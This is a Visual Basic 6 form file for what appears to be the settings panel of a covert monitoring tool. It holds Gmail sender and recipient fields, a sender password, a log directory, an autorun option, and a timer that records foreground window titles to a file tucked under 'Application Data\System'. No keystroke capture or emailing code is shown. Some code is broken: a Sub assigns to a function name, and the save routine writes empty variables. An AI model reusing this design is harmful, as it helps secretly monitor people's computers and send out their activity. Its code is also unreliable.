VERSION 5.00
Begin VB.Form Form1 
   Caption         =   "Form1"
   ClientHeight    =   8685
   ClientLeft      =   60
   ClientTop       =   450
   ClientWidth     =   4905
   LinkTopic       =   "Form1"
   ScaleHeight     =   8685
   ScaleWidth      =   4905
   StartUpPosition =   3  'Windows Default
   Begin VB.TextBox txtUserName 
      Appearance      =   0  'Flat
      Height          =   285
      Left            =   1800
      Locked          =   -1  'True
      TabIndex        =   25
      Text            =   "Nilesh"
      Top             =   120
      Width           =   2055
   End
   Begin VB.CommandButton cmdLoadTitles 
      Caption         =   "Show Titles"
      Height          =   375
      Left            =   240
      TabIndex        =   24
      Top             =   4440
      Width           =   1695
   End
   Begin VB.CommandButton cmdsaveChanges 
      Caption         =   "Save"
      Height          =   375
      Left            =   3000
      TabIndex        =   23
      Top             =   4440
      Width           =   1335
   End
   Begin VB.Frame Frame3 
      Caption         =   "Titles Picker:"
      Height          =   3375
      Left            =   360
      TabIndex        =   16
      Top             =   5160
      Width           =   4335
      Begin VB.CommandButton cmdSaveTitles 
         Caption         =   "Save Titles"
         Height          =   375
         Left            =   1200
         TabIndex        =   22
         Top             =   2880
         Width           =   1695
      End
      Begin VB.CommandButton cmdRemoveTitle 
         Caption         =   ">>"
         Height          =   375
         Left            =   1680
         TabIndex        =   21
         Top             =   1320
         Width           =   495
      End
      Begin VB.CommandButton cmdAddTitles 
         Caption         =   "<<"
         Height          =   375
         Left            =   1800
         TabIndex        =   20
         Top             =   600
         Width           =   495
      End
      Begin VB.CommandButton cmdScanTitles 
         Caption         =   "Pick Titles"
         Height          =   375
         Left            =   2280
         TabIndex        =   19
         Top             =   2400
         Width           =   1935
      End
      Begin VB.Timer Timer1 
         Enabled         =   0   'False
         Interval        =   1000
         Left            =   2280
         Top             =   360
      End
      Begin VB.ListBox List2 
         Height          =   2010
         ItemData        =   "Form1.frx":0000
         Left            =   2280
         List            =   "Form1.frx":0002
         MultiSelect     =   2  'Extended
         TabIndex        =   18
         Top             =   360
         Width           =   1935
      End
      Begin VB.ListBox List1 
         Height          =   2205
         Left            =   120
         TabIndex        =   17
         Top             =   360
         Width           =   1575
      End
   End
   Begin VB.Frame Frame2 
      Caption         =   "Frame2"
      Height          =   1935
      Left            =   120
      TabIndex        =   9
      Top             =   1920
      Width           =   4335
      Begin VB.ComboBox Combo1 
         Height          =   315
         ItemData        =   "Form1.frx":0004
         Left            =   1800
         List            =   "Form1.frx":0014
         TabIndex        =   28
         Text            =   "Combo1"
         Top             =   1440
         Width           =   2295
      End
      Begin VB.TextBox Text6 
         Height          =   285
         Left            =   1800
         TabIndex        =   15
         Text            =   "Text6"
         Top             =   960
         Width           =   2295
      End
      Begin VB.TextBox Text5 
         Height          =   285
         Left            =   1800
         TabIndex        =   14
         Text            =   "Text5"
         Top             =   600
         Width           =   2295
      End
      Begin VB.TextBox Text4 
         Height          =   285
         Left            =   1800
         TabIndex        =   11
         Text            =   "Text4"
         Top             =   240
         Width           =   2295
      End
      Begin VB.Label Label10 
         Caption         =   "Autorun :"
         Height          =   255
         Left            =   120
         TabIndex        =   27
         Top             =   1440
         Width           =   1455
      End
      Begin VB.Label Label8 
         Caption         =   "Computer Description :"
         Height          =   255
         Left            =   120
         TabIndex        =   13
         Top             =   240
         Width           =   1575
      End
      Begin VB.Label Label7 
         Caption         =   "Password to Open :"
         Height          =   255
         Left            =   120
         TabIndex        =   12
         Top             =   960
         Width           =   1455
      End
      Begin VB.Label Label6 
         Caption         =   "Log Directory :"
         Height          =   255
         Left            =   120
         TabIndex        =   10
         Top             =   600
         Width           =   1215
      End
   End
   Begin VB.Frame Frame1 
      Caption         =   "Frame1"
      Height          =   1455
      Left            =   120
      TabIndex        =   0
      Top             =   480
      Width           =   4335
      Begin VB.TextBox Text1 
         Height          =   285
         Left            =   1560
         TabIndex        =   3
         Text            =   "Text1"
         Top             =   960
         Width           =   1695
      End
      Begin VB.TextBox Text2 
         Height          =   285
         Left            =   1560
         TabIndex        =   2
         Text            =   "Text2"
         Top             =   600
         Width           =   1695
      End
      Begin VB.TextBox Text3 
         Height          =   285
         Left            =   1560
         TabIndex        =   1
         Text            =   "Text3"
         Top             =   240
         Width           =   1695
      End
      Begin VB.Label Label5 
         Caption         =   "@gmail.com"
         Height          =   255
         Left            =   3240
         TabIndex        =   8
         Top             =   240
         Width           =   975
      End
      Begin VB.Label Label1 
         Caption         =   "Email Sender :"
         Height          =   255
         Left            =   120
         TabIndex        =   7
         Top             =   600
         Width           =   1455
      End
      Begin VB.Label Label2 
         Caption         =   "Sender Password:"
         Height          =   255
         Left            =   120
         TabIndex        =   6
         Top             =   960
         Width           =   1335
      End
      Begin VB.Label Label3 
         Caption         =   "@gmail.com"
         Height          =   255
         Left            =   3240
         TabIndex        =   5
         Top             =   600
         Width           =   975
      End
      Begin VB.Label Label4 
         Caption         =   "Email Recipient:"
         Height          =   255
         Left            =   120
         TabIndex        =   4
         Top             =   240
         Width           =   1335
      End
   End
   Begin VB.Label Label9 
      Caption         =   "Welcome,"
      Height          =   255
      Left            =   120
      TabIndex        =   26
      Top             =   120
      Width           =   1455
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
'active window title
Private Declare Function GetForegroundWindow Lib "user32" () As Long
Private Declare Function GetWindowTextLength Lib "user32" Alias "GetWindowTextLengthA" (ByVal hwnd As Long) As Long
Private Declare Function GetWindowText Lib "user32" Alias "GetWindowTextA" (ByVal hwnd As Long, ByVal lpString As String, ByVal cch As Long) As Long
Private Declare Function GetParent Lib "user32" (ByVal hwnd As Long) As Long
' Returns the title of the active window.
' if GetParent = true then the parent window is
' returned.
Public Function GetActiveWindowTitle(ByVal ReturnParent As Boolean) As String
Dim i As Long
Dim j As Long

i = GetForegroundWindow


If ReturnParent Then
Do While i <> 0
j = i
i = GetParent(i)
Loop

i = j
End If

GetActiveWindowTitle = GetWindowTitle(i)
End Function
Public Function GetWindowTitle(ByVal hwnd As Long) As String
Dim l As Long
Dim s As String

l = GetWindowTextLength(hwnd)
s = Space(l + 1)

GetWindowText hwnd, s, l + 1

GetWindowTitle = Left$(s, l)
End Function
Private Sub GetPC()
Dim i As Long
Dim j As Long

i = GetForegroundWindow


Do While i <> 0
j = i
i = GetParent(i)
Loop

i = j


GetActiveWindowTitle = GetWindowTitle(i)
End Sub



Private Sub cmdAddTitles_Click()
Timer1.Enabled = False
List2.Enabled = True

If List1.ListCount >= 5 Then MsgBox "Title Box Full!! Remove some Titles.", vbApplicationModal, "Adding Titles": Exit Sub

Dim i As Integer
For i = 0 To (List2.ListCount - 1)
    If (List2.Selected(i)) = True Then
    List2.ListIndex = i
    List1.AddItem (List2.Text)
    End If
Next i
End Sub


Private Sub cmdLoadTitles_Click()
List1.Clear
Dim t1, t2, t3, t4, t5 As String
Open "C:\Documents and Settings\" & txtUserName & "\Application Data\System\default.MCP" For Input As #1
Input #1, t1, t2, t3, t4, t5
Close #1
List1.AddItem t1
List1.AddItem t2
List1.AddItem t3
List1.AddItem t4
List1.AddItem t5
End Sub

Private Sub cmdRemoveTitle_Click()
If List1.ListIndex = -1 Then MsgBox "Choose Titles to Remove.", vbInformation: Exit Sub
List2.AddItem List1.Text, 0
List1.RemoveItem (List1.ListIndex)
If List1.ListCount <> 0 Then List1.ListIndex = 0
End Sub

Private Sub cmdSaveTitles_Click()
Dim t1, t2, t3, t4, t5 As String
Open "C:\Documents and Settings\" & txtUserName & "\Application Data\System\default.MCP" For Output As #1
Write #1, t1, t2, t3, t4, t5
Close #1
MsgBox "Titles Saved Successfully!!"
End Sub

Private Sub cmdScanTitles_Click()
List2.Clear

If cmdScanTitles.Caption = "Stop Picking" Then
Timer1.Enabled = False
List2.Enabled = True
cmdScanTitles.Caption = "Start Picking"
Else
Timer1.Enabled = True
List2.Enabled = False
cmdScanTitles.Caption = "Stop Picking"
Me.WindowState = 1
End If
End Sub

Private Sub Timer1_Timer()
Dim i As Integer
If List2.ListCount >= 10 Then Call cmdScanTitles_Click

List2.ListIndex = List2.ListCount - 1

If GetActiveWindowTitle(True) = "" Or GetActiveWindowTitle(True) = Me.Caption Then Exit Sub

If List2.Text <> GetActiveWindowTitle(True) Then List2.AddItem GetActiveWindowTitle(True)

End Sub

